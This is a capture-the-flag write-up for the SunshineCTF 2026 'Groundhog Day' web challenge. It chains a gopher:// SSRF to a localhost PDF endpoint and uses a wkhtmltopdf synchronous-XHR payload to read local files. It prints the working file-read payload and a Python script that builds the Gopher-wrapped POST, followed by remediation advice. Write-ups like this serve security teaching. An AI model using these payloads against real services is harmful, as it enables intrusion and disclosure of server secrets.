**Attack chain:** `Recon (HTML comment reveals internal feed) → gopher:// SSRF → POST to localhost service → wkhtmltopdf JavaScript XHR → read /flag.txt → recover flag from Base64 PDF`

# Groundhog Day — SunshineCTF 2026

- **Category:** Geo / Web exploitation
- **Points:** 490
- **Flag:** `[REDACTED]`

## TL;DR

- The page’s HTML comment disclosed the internal feed URL, `http://127.0.0.1:8000/feed`, and mentioned a `feed` override.
- The public application accepted both `http://` and `gopher://`. Gopher allowed a raw HTTP request to be sent from the server to its localhost service.
- The internal service’s root page documented a POST-only PDF archive endpoint, `/report`, which used `wkhtmltopdf 0.12.5` and returned the PDF as Base64.
- JavaScript in the submitted report used a synchronous XHR request to read `file:///flag.txt`. The flag was then extracted from the generated PDF.

## Focused reconnaissance

- An HTML source comment exposed the default feed URL and the override parameter.
- Fetching `http://127.0.0.1:8000/` through the feed returned an internal service guide listing:
  - `GET /feed` — station observation JSON.
  - `GET /health` — health check.
  - `POST /report` — render a PDF from a `content` field and return it in a Base64 `data` field.
- The guide identified `wkhtmltopdf 0.12.5` as the PDF renderer.

## Vulnerability analysis and root cause

### 1. SSRF with Gopher support

- The `feed` parameter controlled the URL from which the server fetched station data.
- Source read from `/proc/self/cwd/app.py` confirmed the application explicitly allowed `http://` and `gopher://`, and configured libcurl to permit both protocols.
- Gopher was not limited to fetching a resource: it allowed a raw HTTP request, including a `POST` method and body, to be sent to the internal service at `127.0.0.1:8000`.
- **Root cause:** allowing the protocol was treated as a sufficient SSRF restriction, while Gopher still enabled crafted requests to internal services.

### 2. Local file read through the PDF renderer

- The internal `/report` endpoint accepted untrusted HTML and passed it to an older HTML-to-PDF renderer.
- JavaScript in the report could perform an XHR request to a `file://` URL. The response was rendered as PDF text and returned to the caller.
- Loading `/etc/passwd` in an `<iframe>` did not expose its contents in the tested PDF. A synchronous XHR did. This was the non-obvious bypass that turned local file access into extractable output.
- **Root cause:** untrusted HTML was rendered without sufficiently isolating JavaScript or filesystem access in the PDF renderer.

## Exploitation

### XHR payload to read a local file

```html
<script>
  var x = new XMLHttpRequest();
  x.open('GET', 'file:///flag.txt', false);
  x.send();
  document.write('<pre>' + x.responseText + '</pre>');
</script>
```

### Wrapping the POST request in Gopher

```python
import urllib.parse
import requests

base = "https://odyssey.web.2026.sunshinectf.games/"
html = """<script>
var x=new XMLHttpRequest();
x.open('GET','file:///flag.txt',false);
x.send();
document.write('<pre>'+x.responseText+'</pre>');
</script>"""

# Encode the report form fields first.
body = (
    "content=" + urllib.parse.quote_plus(html)
    + "&title=" + urllib.parse.quote_plus("Archive")
)

# Build a raw HTTP POST to the internal service.
raw = (
    "POST /report HTTP/1.0\r\n"
    "Host: 127.0.0.1:8000\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(body.encode())}\r\n"
    "Connection: close\r\n"
    "\r\n"
    + body
)

# Encode the raw request as a Gopher path. requests encodes the outer feed parameter.
feed = "gopher://127.0.0.1:8000/_" + urllib.parse.quote(raw, safe="")
response = requests.get(base, params={"feed": feed}, timeout=60)
print(response.text)
```

- The Gopher response contained HTTP headers followed by JSON. The JSON `data` field held the PDF encoded as Base64.
- After Base64 decoding, `pdftotext` extracted the report text, which contained the flag. The flag value is intentionally redacted in this write-up.

## Security impact

- In a real deployment, this path would allow **SSRF into internal services**, including sending crafted requests to localhost endpoints.
- If an internal service passed attacker-controlled HTML to a PDF renderer, the combination could enable **local file disclosure** within the renderer process’s permissions—for example, exposing secrets, configuration, or application files.
- The verified impact here was reading `/flag.txt`. **Remote code execution was not demonstrated**, so this should not be described as a confirmed full server compromise.

## Recommended remediation

- Remove Gopher support. If external HTTP fetching is required, use a strict allowlist of hosts, addresses, and paths; block loopback and private address ranges; and revalidate DNS resolution.
- Do not accept arbitrary user-supplied URLs or let a feed-fetching endpoint act as a proxy to internal services.
- Remove the internal report endpoint from public network access, or enforce appropriate authentication and authorization.
- Sanitize report HTML, disable JavaScript and `file://` access, and run PDF rendering in an isolated container with no unnecessary secrets or network access.
- Replace the outdated `wkhtmltopdf` version with a supported alternative and apply least privilege to the rendering process.
